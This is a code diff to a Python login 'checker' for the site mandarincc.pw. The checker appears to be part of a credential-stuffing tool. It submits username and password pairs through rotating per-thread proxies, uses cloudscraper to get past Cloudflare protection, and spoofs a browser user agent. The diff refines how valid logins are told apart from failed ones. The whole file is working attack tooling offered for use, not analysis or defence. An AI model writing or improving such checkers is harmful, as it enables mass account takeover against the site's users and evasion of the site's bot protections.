@@ -1,5 +1,5 @@
 """
-Checker for mandarincc.pw – supports cloudscraper fallback.
+Checker for mandarincc.pw – content-based success detection.
 """
 import threading
 from typing import Tuple
@@ -17,7 +17,6 @@ TIMEOUT = 15
 def check(username: str, password: str) -> Tuple[bool, str]:
     proxy = getattr(threading.current_thread(), 'proxy', None)
 
-    # Use cloudscraper if available (bypasses Cloudflare)
     if HAS_CLOUDSCRAPER:
         session = cloudscraper.create_scraper()
     else:
@@ -27,7 +26,6 @@ def check(username: str, password: str) -> Tuple[bool, str]:
     if proxy:
         session.proxies = {"http": proxy, "https": proxy}
 
-    # Mimic a real browser
     session.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -44,23 +42,36 @@ def check(username: str, password: str) -> Tuple[bool, str]:
     try:
         resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)
 
-        # If status is not 200, might be blocked or server error
         if resp.status_code != 200:
-            return False, f"HTTP {resp.status_code} – server returned error"
+            return False, f"HTTP {resp.status_code} – server error"
 
         html = resp.text.lower()
+        final_url = resp.url.lower()
 
-        # Known failure indicators
-        if "invalid login" in html or "invalid login or pass" in html:
+        # ---- Explicit failure (catch variations) ----
+        if any(phrase in html for phrase in [
+            "invalid login", "invalid login or pass", "invalid username",
+            "incorrect", "wrong password", "login failed"
+        ]):
             return False, "Invalid credentials"
 
-        # Known success indicators (add more if you see them)
+        # ---- Check if we are still on a page with the login form ----
+        if 'name="username"' in html or 'name="user_password"' in html:
+            return False, "Login failed – login form still present"
+
+        # ---- Success indicators ----
         if "logout" in html or "dashboard" in html or "welcome" in html:
             return True, "Login successful"
 
-        # If we got a 200 and no error, but no success marker, assume success
-        # (but warn that we couldn't find a success indicator)
-        return True, "Login successful (assumed – no error found)"
+        # ---- Fallback: if no login form and no error, assume success ----
+        if "login.html" not in final_url and "index.html" in final_url:
+            return True, "Login successful"
+
+        # ---- Still on login page? ----
+        if "login.html" in final_url:
+            return False, "Login failed – still on login page"
+
+        return False, "Login failed – unknown reason"
 
     except Exception as e:
         return False, f"Request error: {str(e)}"
